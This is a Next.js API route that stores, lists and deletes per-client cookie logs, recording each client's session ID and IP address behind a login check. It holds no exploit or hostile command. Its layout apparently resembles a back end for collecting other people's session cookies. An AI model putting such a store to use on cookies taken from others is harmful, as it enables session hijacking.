// app/api/cookies/route.ts
import { NextResponse } from "next/server";
import { mainDb } from "@/lib/db";
import { clients, clientCookies } from "@/lib/schema/main.schema";
import { eq, and, desc } from "drizzle-orm";
import { requireRouteSession } from "@/lib/auth";

export async function GET() {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const rows = mainDb
      .select()
      .from(clientCookies)
      .orderBy(desc(clientCookies.timestamp))
      .all();

    // Parse the JSON cookie string stored in the database
    const parsedCookies = rows.map((log) => {
      let cookiesObj: unknown = [];
      try {
        cookiesObj = JSON.parse(log.cookies);
      } catch {
        cookiesObj = log.cookies;
      }
      return {
        sessionId: log.sessionId,
        timestamp: log.timestamp,
        cookies: cookiesObj,
      };
    });

    return NextResponse.json({ success: true, cookies: parsedCookies });
  } catch (error: any) {
    console.error("Cookies GET Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}

export async function POST(request: Request) {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const body = await request.json();
    const { sessionId, client_ip, cookies } = body;

    if (!sessionId || !client_ip || !cookies) {
      return NextResponse.json(
        {
          success: false,
          error: "Missing required fields (sessionId, client_ip, cookies)",
        },
        { status: 400 }
      );
    }

    const now = new Date().toISOString();

    mainDb.transaction((tx) => {
      // Upsert client record
      tx.insert(clients)
        .values({ sessionId, client_ip, first_seen: now, last_seen: now })
        .onConflictDoUpdate({
          target: clients.sessionId,
          set: { client_ip, last_seen: now },
        })
        .run();

      // Insert cookie log
      tx.insert(clientCookies)
        .values({
          sessionId,
          timestamp: now,
          cookies: JSON.stringify(cookies),
        })
        .run();
    });

    return NextResponse.json({
      success: true,
      message: "Cookies stored successfully",
    });
  } catch (error: any) {
    console.error("Cookies POST Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}

export async function DELETE(request: Request) {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const { searchParams } = new URL(request.url);
    const sessionId = searchParams.get("sessionId");
    const timestamp = searchParams.get("timestamp");

    if (!sessionId || !timestamp) {
      return NextResponse.json(
        { success: false, error: "Missing sessionId or timestamp parameters" },
        { status: 400 }
      );
    }

    mainDb
      .delete(clientCookies)
      .where(
        and(
          eq(clientCookies.sessionId, sessionId),
          eq(clientCookies.timestamp, timestamp)
        )
      )
      .run();

    return NextResponse.json({ success: true, message: "Cookie log deleted" });
  } catch (error: any) {
    console.error("Cookies DELETE Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
